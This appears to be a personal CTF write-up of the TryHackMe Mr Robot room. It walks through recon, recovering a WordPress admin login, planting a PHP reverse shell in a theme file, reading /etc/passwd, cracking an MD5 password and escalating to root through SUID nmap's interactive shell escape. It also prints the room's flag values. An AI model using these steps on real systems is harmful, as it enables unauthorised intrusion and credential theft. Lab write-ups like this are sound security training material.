# TryHackMe MR.Robot  

## 1\. Recon

as always i will start by doing recon using nmap and after that i will continue with the necessary steps to solve this CTF :

### 1.1 nmap

```shell
nmap -T4 -A -v <target_ip>
```

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/dd7dbdda-3ceb-40d8-95da-e39428ce8ef6.png align="center")

so i got 3 open ports and 1 filtered port so in this case my option is to navigate to the website and continue my recon

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/9c28479d-1661-40c1-99ce-14b41139e5ec.png align="center")

i got into the website and the awebsite got the look from the movie mr robot it self and the commads just open parts of the movie except the join one , it asks for email and print we will be in touch so i still need more info so i have to continue recon:

### 1.2 gobuster

*   inthis case i got nothing till no so i have to do gobuster and see if there is an unknown directory or a hidden directory that can be still accessed :
    
    ![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/f5d5362f-195a-4ce5-8afe-1a4a7c620216.png align="center")
    

from the scan we can see there are ways to get in like robots.txt and wp-login are open so i will try robots.txt for the wp-login i have to try brute force to get access to the word press:

> what is robots.txt ?

*   `robots.txt` is a plain-text file placed at the web root (`http://<domain>/robots.txt`) that tells web crawlers/search engine bots which paths they're allowed or disallowed to index. It's part of the **Robots Exclusion Protocol** — a voluntary convention, not a security mechanism. Any well-behaved bot (Googlebot, Bingbot) respects it; nothing enforces it technically.
    

but in this case wwe can see it so lets check what is under robots.txt

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/1f800947-2eaa-4dc0-a6d0-f2c1830a487d.png align="center")

i found 2 files one is a dictionary and the other is the first key.

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/96bf799b-b380-4a75-beae-e4e6740c0204.png align="center")

*   the dictionary must be for the brute force attack for the wp-login page but before that i have to check every open directory if i can find something :
    

i go through every one of those but nothing was there but when i got to the /license there is some txt:

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/0979d791-9766-4759-b900-537ac32ab807.png align="center")

and when i scroll down there are another 2 txts so one of them looks like base 64 so lets check that:

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/6f12c28e-0c1f-46cd-b7de-830aadc95582.png align="center")

```shell
❯ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652
```

its on the form of user name and password so lets try that inside the word press login page:

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/29789a72-f77c-44bb-97c7-41f630437d4b.png align="center")

```shell
username = elliot 
password = ER28-0652
```

and that is the password i got it with out doing no brute force :

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/844d70ad-12c0-4551-b57c-a5420dc0f2da.png align="center")

so i logged as an adminstrator inside wp press so we can add plugins and upload files so we can use that to overwrite the existed php file to a php reverse shell

*   The Theme Editor (Appearance → Editor) is available to any user with the `edit_themes` capability — by default that's only the **Administrator** role in WordPress. So "admin access" isn't incidental here; it's the exact requirement.
    
*   i don't need to *upload* a new file — that's the key point. The theme editor lets me directly overwrite an *existing* file within an *already-installed* theme (like `404.php` in Twenty Fifteen, which ships with WP by default). This is actually the more reliable RCE path because:
    

so lets do that :

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/8f2e86c6-3f75-4b16-aaac-16d3f378e6d7.png align="center")

we can download a php reverse shell from git hub and change the existed one and press upload file :

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/77e364cc-bc95-4b82-b3a5-0c73297f56d4.png align="center")

after that i will use netcat to listen to incoming connection through the given port (4444).

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/2825d2d4-53da-44d5-8d3b-cd4936b69174.png align="center")

while doing that we cave to activate the template to be excute so that we can get the reverse shell (trigger the shell)

```shell
curl http://10.80.186.236/wp-content/themes/twentyfifteen/404.php
```

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/5ab55983-0526-4032-8889-95ee7223f737.png align="center")

and i got reverse shell access from here i have to check every thing :

```shell
$ whoami
daemon
$ $ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ cat /etc/passdwd
cat: /etc/passdwd: No such file or directory
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
uuidd:x:100:101::/run/uuidd:/bin/false
systemd-timesync:x:104:109:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:105:110:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:106:111:systemd Resolver,,,:/run/systemd/resolve:/bin/false
_apt:x:108:65534::/nonexistent:/bin/false
messagebus:x:109:114::/var/run/dbus:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper...:/usr/sbin/nologin
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
$
```

*   From the passwd output, here's how you tell human/loggable accounts apart from system/service accounts:
    
*   ok so `daemon` **is** a real entry in `/etc/passwd` — it exists as an account with a UID/GID (`1:1`) — but its shell is explicitly `/usr/sbin/nologin`:
    

```shell
root:x:0:0:root:/root:/bin/bash
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

this are the user we have so lets narrow it down and try robot first :

```shell
$ ls -la /home/robot/
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2  2025 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ $ cat key-2-of-3.txt
cat: key-2-of-3.txt: No such file or directory
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

ok i got the 2nd key here but also i got a string file that say raw md5 so lets decrypt it and try it as a password for robot:

*   so after decrypt i got a string is a - z so lets try that
    

```shell
$ su robot
Password: abcdefghijklmnopqrstuvwxyz
```

and it worked so lets copy the second key and continue to esclate privilage to root :

```shell
cat /home/robot/key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

*   so lets check what binaries have suid access
    
    ```shell
    $ sudo -l
      find / -perm -4000 -type f 2>/dev/null
    
    /bin/umount
    /bin/mount
    /bin/su
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/sudo
    /usr/bin/pkexec
    /usr/local/bin/nmap
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    
    ```
    

from this on i will check GTFObins and see what can i find

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/4d3fcfa0-405e-4dd1-be78-407ec059424d.png align="center")

*   **Type:** Local privilege escalation via misconfiguration (not a CVE — GTFOBins-documented technique)
    
    **Root cause:** `/usr/local/bin/nmap` had the SUID bit set with `root` as owner:
    

**Why it's exploitable:** The installed nmap version (pre-5.30, consistent with this box's 2015 build) shipped with a legacy `--interactive` mode — a scripting-style REPL (`nmap>` prompt) supporting a `!<command>` shell-escape syntax, similar to `vim`, `less`, `gdb`, and other classic CLI tools of that era.

*   Looking at that list, most are standard SUID binaries every Linux box has for legitimate reasons (`passwd`, `chsh`, `su`, `mount`/`umount`, `gpasswd`) — these require you to already know a valid password/target, they're not generic shell-escape vectors on their own.
    
    But `/usr/bin/pkexec` stands out — that's the binary behind **CVE-2021-4034**, nicknamed **PwnKit**. It's arguably more famous than the nmap trick at this point.
    
    **Why pkexec is interesting**
    
    `pkexec` is part of PolicyKit, meant to let authorized users run commands as another user (like a controlled sudo alternative). CVE-2021-4034 is a **memory corruption vulnerability** in how pkexec parses command-line arguments when called with **zero arguments** — it mishandles `argc`/`argv[0]` and ends up executing attacker-controlled environment variables as part of its own logic, leading to arbitrary code execution as root, on basically any Linux distro's default pkexec build (affected almost every distro from ~2009 until patched in 2022).
    
*   so i will choose the simple one and go with the nmap
    

```shell
nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

then finally i got root access:

```shell
find / -iname "key-3*" 2>/dev/null
/root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

and there it is the 3rd key:

> thank you for reading!